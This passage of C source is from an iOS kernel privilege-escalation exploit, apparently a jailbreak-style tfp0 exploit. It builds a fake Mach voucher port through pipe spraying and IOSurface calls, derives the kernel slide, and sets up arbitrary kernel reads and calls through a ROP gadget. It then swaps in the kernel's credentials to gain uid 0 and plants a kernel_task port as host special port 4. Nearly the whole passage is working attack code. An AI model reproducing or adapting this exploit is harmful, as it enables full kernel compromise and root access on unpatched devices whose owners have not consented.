        dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        doassure(!ret, {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
        });
    }
    
    LOG("replaceing real_port_to_fake_voucher...");
    sync();//flush pipe writes
    usleep(500);
    mach_port_t old_real_port_to_fake_voucher = real_port_to_fake_voucher;
    //get shifted port
    assure(!(ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher)));
    
    LOG("old real_port_to_fake_voucher=%d",old_real_port_to_fake_voucher);
    LOG("new real_port_to_fake_voucher=%d",real_port_to_fake_voucher);
    
    doassure(old_real_port_to_fake_voucher != real_port_to_fake_voucher, {
        LOG("Failed to receive fake port");
    });
    
    
    //make this guy special
    assure(!(ret = _kernelrpc_mach_port_insert_right_trap(self, real_port_to_fake_voucher, real_port_to_fake_voucher, MACH_MSG_TYPE_COPY_SEND)));
    
    for(uint32_t i = 0; i < pipecnt; ++i){
        int rfd = pipefds[2 * i];
        ssize_t didread = read(rfd, pipebuf, pagesize);
        assure(didread == pagesize);
        
        kport_t *p = (kport_t *)pipebuf;
        
        if (p->ip_srights != kport.ip_srights) {
            int wfd = pipefds[2 * i + 1];
            gfakeport_idx = i;
            LOG("p->ip_srights=%d",p->ip_srights);
            LOG("gfakeport_idx=%d",gfakeport_idx);
            ssize_t written = write(wfd, pipebuf, pagesize);
            assure(written == pagesize);
        }
    }
    assure(gfakeport_idx!=-1);
    
    
#pragma mark kread
    /***
     ready is my read :D
     ***/
    
    mach_port_t notify = MACH_PORT_NULL;
    //set ip_pdrequest
    for (int i=0; i<NUM_AFTER2; i++) {
        assure(!(ret = mach_port_request_notification(mach_task_self(), after2[i], MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify)));
    }
    
    for (int i=0; i<NUM_BEFORE; i++) {
        assure(!(ret = mach_port_request_notification(mach_task_self(), before[i], MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify)));
    }
    
    for (int i=0; i<NUM_AFTER; i++) {
        assure(!(ret = mach_port_request_notification(mach_task_self(), after[i], MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify)));
    }
    
    
    kptr_t recv_port_address = port_address - sizeof(kport);
    LOG("useport_addr=%p",(void*)recv_port_address);
    
    LOG("doing first kread...");
    usleep(500);
    
    kptr_t test = kread64(targetVoucher.iv_port);
    printf("test=%p\n",(void*)test);
    
    
    kptr_t realport_addr = kread64(recv_port_address + offsetof(kport_t, ip_pdrequest));
    LOG("realport_addr=%p",(void*)realport_addr);
    
    
    kptr_t itk_space = kread64(realport_addr + offsetof(kport_t, ip_receiver));
    LOG("itk_space=%p",(void*)itk_space);
    
    kptr_t self_task = kread64(itk_space + OFFSET_IPC_SPACE_IS_TASK);
    LOG("self_task=%p",(void*)self_task);
    
    
    assure(!(ret = mach_ports_register(mach_task_self(), &client, 1)));
    
    kptr_t IOSurfaceRootUserClient_port = kread64(self_task + OFFSET_TASK_ITK_REGISTERED);
    LOG("IOSurfaceRootUserClient_port=%p",(void*)IOSurfaceRootUserClient_port);
    
    kptr_t IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + offsetof(kport_t, ip_kobject));
    LOG("IOSurfaceRootUserClient_addr=%p",(void*)IOSurfaceRootUserClient_addr);
    
    kptr_t IOSurfaceRootUserClient_vtab = kread64(IOSurfaceRootUserClient_addr);
    LOG("IOSurfaceRootUserClient_vtab=%p",(void*)IOSurfaceRootUserClient_vtab);
    
    kbase = kread64(IOSurfaceRootUserClient_vtab + OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX*sizeof(kptr_t));
    
    kbase = (kbase & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
    
    for(; kread32(kbase) != KERNEL_MAGIC; kbase -= KERNEL_SLIDE_STEP);
    
    uint64_t slide = kbase-OFFSET_KERNELBASE;
    LOG("Kernel base: %p",(void*)kbase);
    LOG("Kernel Magic: 0x%08x",kread32(kbase));
    LOG("Kernel slide: %p",(void*)slide);
    
    
#define OFF(name) (OFFSET_##name + slide)
    
    kptr_t zone_map_addr = kread64(OFF(ZONE_MAP));
    printf("zone_map_addr=%p\n", (void*)zone_map_addr);
    
    ktask_t ktask = {};
    ktask.a.lock.data = 0x0;
    ktask.a.lock.type = 0x22;
    ktask.a.ref_count = 100;
    ktask.a.active = 1;
    ktask.a.map = zone_map_addr;
    ktask.b.itk_self = 1;
    
    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport.ip_kobject = targetVoucher.iv_port + 0x100;
    kport.ip_requests = 0;
    kport.ip_context = 0;
    LOG("kport.ip_kobject=%p",(void*)kport.ip_kobject);
    
    
    //write to kport
    {
        int rfd = pipefds[2 * gfakeport_idx];
        ssize_t didread = read(rfd, pipebuf, pagesize);
        assure(didread == pagesize);
        int wfd = pipefds[2 * gfakeport_idx + 1];
        
        uintptr_t ptr = (uintptr_t)pipebuf;
        *(volatile kport_t*)ptr = kport;
        
        ptr += 0x100;
        *(volatile ktask_t*)ptr = ktask;
        
        ssize_t written = write(wfd, pipebuf, pagesize);
        assure(written == pagesize);
    }
    
    usleep(200);
    
    LOG("remapping fakeport"); //well, code for this was already here so, why bother removing it?
    vm_prot_t cur = 0,
    max = 0;
    mach_vm_address_t shmem_addr = 0;
    kptr_t base_shared = targetVoucher.iv_port;
    sched_yield();
    ret = mach_vm_remap(self, &shmem_addr, pagesize, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, real_port_to_fake_voucher, base_shared, false, &cur, &max, VM_INHERIT_NONE);
    doassure(!ret,{
        LOG("mach_vm_remap: %s", mach_error_string(ret));
    });
    
    *(uint8_t*)(shmem_addr+pagesize-1) = 123; // fault page
    
    LOG("shmem_addr: 0x%016llx", shmem_addr);
    kport_t *shared_kport = (kport_t *)shmem_addr; //size is something like 0xa8
    ktask_t *shared_zm_task_buf = (ktask_t*)(shmem_addr + 0x100);
    ktask_t *shared_km_task_buf = (ktask_t*)(shmem_addr + 0x400);
    
    kobj_t *shared_kobj = (kobj_t *)(shmem_addr + 0x700);
    
    uint64_t *shared_vtab = (uint64_t*)(shmem_addr + pagesize - 200*8); //risky guy
    
    LOG("dumping vtab...");
    //get a fast read real quick
    shared_kport->ip_kobject = base_shared +0x100;
    for (int i=0; i<200; i++) {
        int r = 0;
        uint64_t fullr = 0;
        *(kptr_t*)(shmem_addr+0x100+OFFSET_TASK_BSD_INFO) = (-BSDINFO_PID_OFFSET) + IOSurfaceRootUserClient_vtab + i*8;
        ret = pid_for_task(real_port_to_fake_voucher, &r);
        fullr |= r;
        *(kptr_t*)(shmem_addr+0x100+OFFSET_TASK_BSD_INFO) = (-BSDINFO_PID_OFFSET) + IOSurfaceRootUserClient_vtab+ i*8 + 4;
        ret = pid_for_task(real_port_to_fake_voucher, &r);
        fullr |= ((uint64_t)r) << 32;
        shared_vtab[i] = fullr;
    }
    
    //modify vtab
    shared_vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX] = OFFSET_ROP_LDR_X0_X0_0X10+slide;
    
    //setup KCALL
    memset((void*)shared_kobj, 0, sizeof(kobj_t));
    shared_kobj->a.vtab = (kptr_t)((kptr_t)shared_vtab-(kptr_t)shmem_addr+(kptr_t)base_shared);
    shared_kobj->a.refs = 100;
    shared_kobj->a.trap_ptr = (kptr_t)((kptr_t)shared_kobj-(kptr_t)shmem_addr+(kptr_t)base_shared + offsetof(kobj_t, a.obj));
    shared_kobj->a.break_stuff = 0;
    shared_kobj->b.__ipc = 100;
    
    shared_kport->ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    shared_kport->ip_kobject = (kptr_t)((kptr_t)shared_kobj-(kptr_t)shmem_addr+(kptr_t)base_shared);
    
    // First arg to KCALL can't be == 0, so we need KCALL_ZERO which indirects through OSSerializer::serialize.
    // That way it can take way less arguments, but well, it can pass zero as first arg.
#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
( \
shared_kobj->a.obj = (kptr_t)(x0), \
shared_kobj->a.func = (kptr_t)(addr), \
(kptr_t)IOConnectTrap6(real_port_to_fake_voucher, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)) \
)
#define KCALL_ZERO(addr, x0, x1, x2) \
( \
shared_kobj->a.obj = ((kptr_t)((kptr_t)shared_kobj-(kptr_t)shmem_addr+(kptr_t)base_shared + offsetof(kobj_t, a.indirect)) - 2 * sizeof(kptr_t)), \
shared_kobj->a.func = OFF(OSSERIALIZER_SERIALIZE), \
shared_kobj->a.indirect[0] = (x0), \
shared_kobj->a.indirect[1] = (x1), \
shared_kobj->a.indirect[2] = (addr), \
(kptr_t)IOConnectTrap6(real_port_to_fake_voucher, 0, (kptr_t)(x2), 0, 0, 0, 0, 0) \
)
    
    
    kptr_t kernel_task_addr = 0;
    int r = (int)KCALL(OFF(COPYOUT), OFF(KERNEL_TASK), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
    printf("kernel_task=%p, %s\n",(void*)kernel_task_addr, mach_error_string(r));
    assure(!r);
    
    kptr_t kernproc_addr = 0;
    r = (int)KCALL(OFF(COPYOUT), kernel_task_addr + OFFSET_TASK_BSD_INFO, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
    printf("kernproc_addr=%p, %s\n",(void*)kernproc_addr, mach_error_string(r));
    assure(!r);
    
    kptr_t kern_ucred = 0;
    r = (int)KCALL(OFF(COPYOUT), kernproc_addr + OFFSET_PROC_UCRED, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    printf("kern_ucred=%p, %s\n",(void*)kern_ucred, mach_error_string(r));
    assure(!r);
    
    kptr_t self_proc = 0;
    r = (int)KCALL(OFF(COPYOUT), self_task + OFFSET_TASK_BSD_INFO, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
    printf("self_proc=%p, %s\n",(void*)self_proc, mach_error_string(r));
    assure(!r);
    
    kptr_t self_ucred = 0;
    r = (int)KCALL(OFF(COPYOUT), self_proc + OFFSET_PROC_UCRED, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    printf("self_ucred=%p, %s\n",(void*)self_ucred, mach_error_string(r));
    assure(!r);
    
    int olduid = getuid();
    printf("uid: %u\n", olduid);
    
    KCALL(OFF(KAUTH_CRED_REF), kern_ucred, 0, 0, 0, 0, 0, 0);
    r = (int)KCALL(OFF(COPYIN), &kern_ucred, self_proc + OFFSET_PROC_UCRED, sizeof(kern_ucred), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
    printf("stole the kernel's credentials\n");
    setuid(0); // update host port
    
    int newuid = getuid();
    printf("uid: %u\n", newuid);
    
    host_t realhost = mach_host_self();
    printf("realhost: %x (host: %x)\n", realhost, host);
    
    memset((void*)shared_km_task_buf, 0, sizeof(ktask));
    shared_zm_task_buf->a.lock.data = 0x0;
    shared_zm_task_buf->a.lock.type = 0x22;
    shared_zm_task_buf->a.ref_count = 100;
    shared_zm_task_buf->a.active = 1;
    shared_zm_task_buf->b.itk_self = 1;
    shared_zm_task_buf->a.map = zone_map_addr;
    
    memset((void*)shared_km_task_buf, 0, sizeof(ktask));
    shared_km_task_buf->a.lock.data = 0x0;
    shared_km_task_buf->a.lock.type = 0x22;
    shared_km_task_buf->a.ref_count = 100;
    shared_km_task_buf->a.active = 1;
    shared_km_task_buf->b.itk_self = 1;
    
    
    r = (int)KCALL(OFF(COPYOUT), OFF(KERNEL_MAP), &shared_km_task_buf->a.map, sizeof(shared_km_task_buf->a.map), 0, 0, 0, 0);
    printf("kernel_map=%p, %s\n",(void*)shared_km_task_buf->a.map, mach_error_string(r));
    assure(!r && shared_km_task_buf->a.map);
    
    
    kptr_t ipc_space_kernel = 0;
    r = (int)KCALL(OFF(COPYOUT), IOSurfaceRootUserClient_port + offsetof(kport_t, ip_receiver), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
    printf("ipc_space_kernel=%p, %s\n",(void*)ipc_space_kernel, mach_error_string(r));
    assure(!r && ipc_space_kernel);
    
    
    kmap_hdr_t zm_hdr = { 0 };
    r = (int)KCALL(OFF(COPYOUT), shared_zm_task_buf->a.map + OFFSET_VM_MAP_HDR, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
    printf("zm_range: %016llx-%016llx, %s\n", zm_hdr.start, zm_hdr.end, mach_error_string(r));
    assure(!r && zm_hdr.start && zm_hdr.end);
    
    if(zm_hdr.end - zm_hdr.start > 0x100000000){
        printf("zone_map is too big, sorry.\n");
        assure(0);
    }
    
    kptr_t zm_tmp = 0; // macro scratch space
#   define ZM_FIX_ADDR(addr) \
( \
zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
)
    
    kptr_t zm_task_addr = (kptr_t)((kptr_t)shared_zm_task_buf-(kptr_t)shmem_addr+(kptr_t)base_shared);
    printf("zm_task_addr=%p\n",(void*)zm_task_addr);
    
    kptr_t km_task_addr = (kptr_t)((kptr_t)shared_km_task_buf-(kptr_t)shmem_addr+(kptr_t)base_shared);
    printf("km_task_addr=%p\n",(void*)km_task_addr);
    
    kptr_t ptrs[2] = { 0 };
    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    printf("zm_port addr: %p\n", (void*)ptrs[0]);
    printf("km_port addr: %p\n", (void*)ptrs[1]);
    
    
    
    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
    
    r = (int)KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    
    mach_msg_type_number_t mapsNum = 0;
    mach_port_array_t maps = NULL;
    ret = mach_ports_lookup(mach_task_self(), &maps, &mapsNum);
    printf("mach_ports_lookup: %s\n", mach_error_string(ret));
    assure(!ret);
    
    printf("zone_map port: %x\n", maps[0]);
    printf("kernel_map port: %x\n", maps[1]);
    assure(MACH_PORT_VALID(maps[0]) && MACH_PORT_VALID(maps[1]));
    
    // Clean out the pointers without dropping refs
    ptrs[0] = ptrs[1] = 0;
    r = (int)KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    mach_vm_address_t remap_addr = 0;
    ret = mach_vm_remap(maps[1], &remap_addr, OFFSET_SIZEOF_TASK, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    printf("mach_vm_remap: %s\n", mach_error_string(ret));
    assure(!ret);
    
    printf("remap_addr: 0x%016llx\n", remap_addr);
    
    ret = mach_vm_wire(realhost, maps[1], remap_addr, OFFSET_SIZEOF_TASK, VM_PROT_READ | VM_PROT_WRITE);
    printf("mach_vm_wire: %s\n", mach_error_string(ret));
    assure(!ret);
    
    
    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    printf("newport=%p\n",(void*)newport);
    
    KCALL(OFF(IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
    
    KCALL(OFF(IPC_PORT_MAKE_SEND), newport, 0, 0, 0, 0, 0, 0);
    
    r = (int)KCALL(OFF(COPYIN), &newport, OFF(REALHOST) + OFFSET_REALHOST_SPECIAL + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    printf("kernel_task=%x, %s\n",kernel_task, mach_error_string(r));
    assure(!r && MACH_PORT_VALID(kernel_task));
    
    printf("cleaning up...\n");
    usleep(100000); // Allow logs to propagate
    
    printf("getting our creds back...\n");
    r = (int)KCALL(OFF(COPYIN), &self_ucred, self_proc + OFFSET_PROC_UCRED, sizeof(kern_ucred), 0, 0, 0, 0);
    printf("copyin=%s\n",mach_error_string(r));
    assure(!r);
    
    setuid(501);
    printf("uid: %d\n", getuid());
    
    RELEASE_PORT(maps[0]);
    RELEASE_PORT(maps[1]);
    shared_kport->ip_bits = 0;
    shared_kport->ip_kobject = 0;
    RELEASE_PORT(real_port_to_fake_voucher);
    
    assure(!(ret = thread_set_mach_voucher(mach_thread_self(), p4)));
    RELEASE_PORT(client);
    
    for (size_t i = 0; i<2*pipecnt; i++) {
        if (pipefds[i] != -1){
            close(pipefds[i]);
        }
    }
    if (pipebuf) {
        assure(!(ret = mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)pipebuf, pagesize)));
        pipebuf = NULL;
    }
    if (pipefds) {
        free(pipefds);
        pipefds = NULL;
    }
    pipecnt = 0;
    
error:
    if (err) {
        printf("exploit failed!\n");
        printf("error=%d ret=0x%08x s=%s\n",err,ret,mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    extern uint64_t KernelBase;
    KernelBase = kbase;
    return kernel_task;
}

